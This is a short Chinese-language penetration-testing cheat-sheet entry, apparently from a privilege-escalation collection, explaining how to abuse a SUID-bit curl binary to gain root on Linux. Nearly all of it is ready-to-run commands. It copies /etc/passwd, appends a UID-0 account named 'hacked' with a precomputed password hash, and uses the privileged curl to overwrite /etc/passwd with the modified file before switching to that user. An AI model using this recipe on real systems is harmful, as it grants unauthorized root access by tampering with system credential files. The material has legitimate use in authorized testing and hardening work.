# curl 

curl suid 提权思想：利用 s 权限下载远程文件覆盖目标靶机上的文件进行提权。

先创建一个 passwd 文件，写入下面一行：
```
# 用户名 hacked ，密码 pass123
hacked:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
```
命令如下：
```
cp /etc/passwd .
echo 'hacked:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' >> passwd # 注意必须是单引号
```
![](https://isecurityclub-1253463441.cos.ap-chengdu.myqcloud.com/curl-1.png)


如果 `curl` 具有 s 权限，可使用如下命令获取 root 权限：

```
./curl http://127.0.0.1:8000/passwd -o /etc/passwd
su hacked
密码为 pass123
```

![](https://isecurityclub-1253463441.cos.ap-chengdu.myqcloud.com/curl-2.png)
